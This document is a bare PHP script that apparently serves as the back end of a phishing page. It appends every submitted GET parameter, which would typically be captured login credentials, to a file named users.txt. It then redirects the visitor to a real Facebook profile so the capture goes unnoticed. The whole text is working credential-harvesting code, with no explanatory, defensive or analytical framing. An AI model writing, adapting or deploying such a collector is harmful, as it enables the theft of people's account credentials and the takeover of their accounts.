:<?php
header("Location: https://www.facebook.com/profile.php?id=100001295764354&fref=ts");
$handle = fopen("users.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 
